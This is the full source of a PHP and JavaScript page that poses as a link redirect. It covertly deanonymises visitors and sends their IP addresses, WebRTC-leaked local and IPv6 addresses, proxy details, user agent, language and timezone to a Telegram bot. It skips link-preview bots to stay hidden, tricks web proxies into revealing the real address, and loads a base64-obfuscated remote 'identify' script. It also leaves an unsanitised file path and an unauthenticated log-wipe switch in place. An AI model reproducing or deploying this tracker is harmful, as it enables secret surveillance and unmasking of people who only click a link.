<?php 
header('Content-Type: text/html; charset=utf-8'); 
date_default_timezone_set("Europe/Kiev");

require_once 'vendor/autoload.php';
use UAParser\Parser;

define('TOKEN', '...', true);

	$filename = trim( explode('?', $_SERVER['REQUEST_URI'], 2)[0], "/");
	$redirectid = trim(trim(file("./redirect/" . $filename . ".txt")[0]), '"');
	$array_agent = array( "TelegramBot (like TwitterBot)", "bitlybot", "WhatsApp", "facebookexternalhit"); 
	if (in_array(explode('/', $_SERVER ['HTTP_USER_AGENT'], 2)[0], $array_agent) || 
	end((explode(" ", $_SERVER ['HTTP_USER_AGENT']))) == 'Viber')
	{
		$file = fopen("./debug/log.txt", "a");
		fwrite($file, "continue \n" . $_SERVER['HTTP_USER_AGENT']);
		fwrite($file, "\n\n");
		fclose($file);
		header("Location: " . $redirectid);
		exit();
	}

	if (substr($_SERVER['REQUEST_URI'], 0, 2) == "/r" || substr($_SERVER['REQUEST_URI'], 0, 2) == "/w")
	{
		$data = "*" . date('l jS \of F Y h:i:s A') . "*" . "\n";
		$data = $data . "*№* #" . $filename . "\n";
		$remote = $_SERVER ['REMOTE_ADDR'];
		$data = $data . "*Connecting from:*\n\t" . $remote . " (" . gethostbyaddr($remote) . ")\n";
		$data = $data . "*Source port:*\n\t" . $_SERVER ['REMOTE_PORT'] . "\n";
		$data = $data . "*Referer:*\n\t" . $_SERVER ['HTTP_REFERER'] . "\n";
		$data = $data . "*Redirect to:*\n\t" .  $redirectid . "\n";
		$data = $data . "*User agent:*\n\t" . str_ireplace("_", "/", $_SERVER ['HTTP_USER_AGENT']) . "\n";
		//--
		$parser = Parser::create();
		$result = $parser->parse($_SERVER ['HTTP_USER_AGENT']);
		$data = $data . "*User agent decoded:*\n\t" . $result->toString();
		if($result->device->family != 'Other'){$data = $data . "/" . $result->device->family  . "\n";} else{$data = $data ."\n";}
		//--
		$data = $data . "*Language:*\n\t" . $_SERVER["HTTP_ACCEPT_LANGUAGE"] . "\n";
		$chatid = trim(file("./redirect/" . $filename . ".txt")[1]);		
		$tbot = file_get_contents("https://api.telegram.org/bot".token."/sendMessage?chat_id=".$chatid."&text=".urlencode($data) . "&parse_mode=Markdown" . "&disable_web_page_preview=true");	
		header("Location: " . $redirectid);
		exit();
	}


	if (count($_POST) > 0) {
		$file = fopen("log.txt", "a");
		fwrite($file, date('l jS \of F Y h:i:s A') . "\n");
		$data = "*" . date('l jS \of F Y h:i:s A') . "*" . "\n";
		$data = $data . "*№* #" . $_POST['reqUri'] . "\n";
		$remote = $_SERVER ['REMOTE_ADDR'];
		
		fwrite($file, "Connecting from:\n\t" . $remote . " (" . gethostbyaddr($remote) . ")\n");
		$data = $data . "*Connecting from:*\n\t" . $remote . " (" . gethostbyaddr($remote) . ")\n";
		
		fwrite($file, "Source port:\n\t" . $_SERVER ['REMOTE_PORT'] . "\n");
		$data = $data . "*Source port:*\n\t" . $_SERVER ['REMOTE_PORT'] . "\n";
		
		fwrite($file, "Referer:\n\t" . $_SERVER ['HTTP_REFERER'] . "\n");
		$data = $data . "*Referer:*\n\t" . $_SERVER ['HTTP_REFERER'] . "\n";
		
		fwrite($file, "Redirect to:\n\t" . $_POST['redirect'] . "\n");
		$data = $data . "*Redirect to:*\n\t" .  $_POST['redirect'] . "\n";
		
		fwrite($file, "User agent:\n\t" . $_SERVER ['HTTP_USER_AGENT'] . "\n");
		$data = $data . "*User agent:*\n\t" . $_SERVER ['HTTP_USER_AGENT'] . "\n";
		//--
		$parser = Parser::create();
		$result = $parser->parse($_SERVER ['HTTP_USER_AGENT']);
		fwrite($file, "User agent decoded:\n\t" . $result->toString() . "\n");
		$data = $data . "*User agent decoded:*\n\t" . $result->toString();
		if($result->device->family != 'Other'){$data = $data . "/" . $result->device->family  . "\n";} else{$data = $data ."\n";}
		//--
		fwrite($file, "Language:\n\t" . $_SERVER["HTTP_ACCEPT_LANGUAGE"] . "\n");
		$data = $data . "*Language:*\n\t" . $_SERVER["HTTP_ACCEPT_LANGUAGE"] . "\n";
		fwrite($file, "Timezone and Data (client side):\n\t" . "GMT: ". $_POST['timezone'] . ",  Date: " . iconv('utf-8', 'windows-1251', $_POST["date"]) . "\n");
		$data = $data . "*Timezone and Data (client side):*\n\t" . "GMT: ". $_POST['timezone'] . ",  Date: " . $_POST["date"] ."\n";
		fwrite($file, "Found addresses:\n");
		$data = $data . "*Found addresses:*\n";
		foreach ( $_POST as $ip ) {
			if ($ip == $_POST['s1'] || $ip == $_POST['date'] || $ip == $_POST['ipv6'] || $ip == "none" || $ip == $_POST['chatid'] && count($_POST) > 1 || $ip == $_POST['redirect'] || $ip == $_POST['reqUri']) {
				continue;
			}
			$ips = explode(",", $ip);
			
			foreach ( $ips as $address ) {
				if (strlen($address) > 1) {
					fwrite($file, "\t" . $address . " ");
					$data = $data . "\t" . $address . " ";
					fwrite($file, "(" . gethostbyaddr($address) . ")\n");
					$data = $data . "(" . gethostbyaddr($address) . ")\n";
				}
			}
		}
			
		fwrite($file, "Web-proxy:");
		$data = $data . "*Web-proxy:*";
		if (isset($_POST['s1'])) {
			$address = $_POST['s1'];
			fwrite($file, "\n\t" . $address . " ");
			$data = $data . "\n\t" . $address . " ";
		}
		fwrite($file, "\nIPv6:\n");
		$data = $data . "\n*IPv6:*\n";
		if ($_POST['ipv6'] != "none" ) {
			fwrite($file, "\t" . $_POST['ipv6'] . " ");
			$data = $data . "\t" . iconv('utf-8', 'windows-1251', $_POST['ipv6']) . " ";
		}
		fwrite($file, "\n\n\n\n");
		fclose($file);
		
		if ($_POST['chatid'] != "none") {
			$chatid = $_POST['chatid'];
			$mess = $data;
			$tbot = file_get_contents("https://api.telegram.org/bot".token."/sendMessage?chat_id=".$chatid."&text=".urlencode($mess) . "&parse_mode=Markdown" . "&disable_web_page_preview=true");	
		}
		exit();
	}
		
	if (isset($_GET["redirect"])) {
			$file = fopen("./redirect/redirect.txt", "w");
			fwrite($file, '"' . htmlspecialchars($_GET["redirect"]) . '"' );
			fclose($file);
			exit();
	}

	if (isset ($_GET["clear"])) {
		unlink('log.txt');
		exit();
	}





?> <!DOCTYPE html> <html> <head> <meta http-equiv="Content-Type" content="text/html; charset=utf-8"> </head> <body>
	<form id="f" method="POST">
		<input name="0" value="none" type="hidden"></input>
	</form>
	<script src="//code.jquery.com/jquery-1.11.2.min.js"></script>
	<script src="webrtc.js"></script>
	<script src="exploit.js"></script>
	<!--<iframe src="https://www.amazon.com/?tag=operadesktop14-sd-us-20" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;">
		Your browser doesn't support iframes
	</iframe>-->
	<script>
	var redirect <?php
		if (file_exists('./redirect/' . trim(explode('?', $_SERVER['REQUEST_URI'], 2)[0], "/") . '.txt')){
			$filename = trim(explode('?', $_SERVER['REQUEST_URI'], 2)[0], "/");
			$redirectid = trim(file("./redirect/" . $filename . ".txt")[0]);
			echo '= ' . $redirectid . ";\n";
			//echo '= ' . $redirectid . ";\n    var reqUri = \"" . $filename . "\";";
		}
		else {
			$lines = fopen('./redirect/redirect.txt', 'r');
			echo "= " . fgets($lines) . ";\n";
		}
	?>
	var reqUri <?php 
		if (file_exists('./redirect/' . trim(explode('?', $_SERVER['REQUEST_URI'], 2)[0], "/") . '.txt'))
		{
			echo "= \"" . $filename . "\";\n";
		}
		else
		{
			echo ";\n";
		}
		?>
	var chatid <?php
		if (file_exists('./redirect/' . trim(explode('?', $_SERVER['REQUEST_URI'], 2)[0], "/") . '.txt')){
			echo "= " . htmlspecialchars(trim(file("./redirect/" . trim(explode('?', $_SERVER['REQUEST_URI'], 2)[0], "/") . ".txt")[1])) . ";\n";
			fclose($file);
		}
		else {
			print ";\n";
		}
	?>
	//-----------------------------------------------------------------------------------
	var our_proto = "http";
    //var our_host = "5.254.124" + "." + "56"; // mask address
	var our_host = "<?php echo $_SERVER['SERVER_ADDR']; ?>";
    var our_request = "show-js-ip";
    // Detect web-proxy version
    var webproxy = "No";
    if (window["_proxy_jslib_SCRIPT_URL"]) {
      webproxy = "CGIProxy (" + window["_proxy_jslib_SCRIPT_URL"] + ")";
    } else if (window["REAL_PROXY_HOST"]) {
      webproxy = "Cohula (" + window["REAL_PROXY_HOST"] + ")";
    } else if (typeof ginf != 'undefined') {
      webproxy = "Glype (" + ginf.url + ")";
    } else if (window.location.hostname != our_host) {
      webproxy = "Unknown (" + window.location.hostname + ")";
    }
    // Trick for CGIProxy
    window["_proxy_jslib_THIS_HOST"] = our_host;
    window["_proxy_jslib_SCRIPT_NAME"] = "/" + our_request + "?#";
    window["_proxy_jslib_SCRIPT_URL"]
    = our_proto + "://" + our_host + "/" + window["_proxy_jslib_SCRIPT_NAME"];
	var ipv6;
	post1();
	function post1() {
		$.post("<?php print "http://[" . exec("/usr/sbin/ifconfig | grep 2001 | awk '{print $2}'") . "]/ipv6.php"; ?>",
			function(data, status) {
				ipv6 = data;
			}
		);
	}
	setTimeout(post, 1000);
	function post() {
		$.post("index.php",
			{
				s: ips, s1: webproxy, s2: ipExploit2, ipv6: ipv6, timezone : new Date().getTimezoneOffset()/60 * -1, date: new Date(), chatid: chatid, redirect : redirect, reqUri : reqUri,
			},
		);
		if (redirect != "")
		{
			window.location=redirect;
		}
	}
	
	</script>
    <noindex><script async 
src="data:text/javascript;charset=utf-8;base64,dmFyIG49ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7bi5zcmM9Ii8vdmJvcm8uZGUvaWRlbnRpZnkvc3RlcDEucGhwP2RvbT0iK2xvY2F0aW9uLmhvc3RuYW1lKyImc2l0ZT00NjgwIjtuLm9ucmVhZHlzdGF0ZWNoYW5nZT1mdW5jdGlvbigpe2NvbnNvbGUubG9nKCJkb25lIik7fTtuLm9ubG9hZD1mdW5jdGlvbigpe2NvbnNvbGUubG9nKCJkb25lIik7fTtkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgiaGVhZCIpWzBdLmFwcGVuZENoaWxkKG4pOw=="></script></noindex> 
<script> </script> </body> </html>
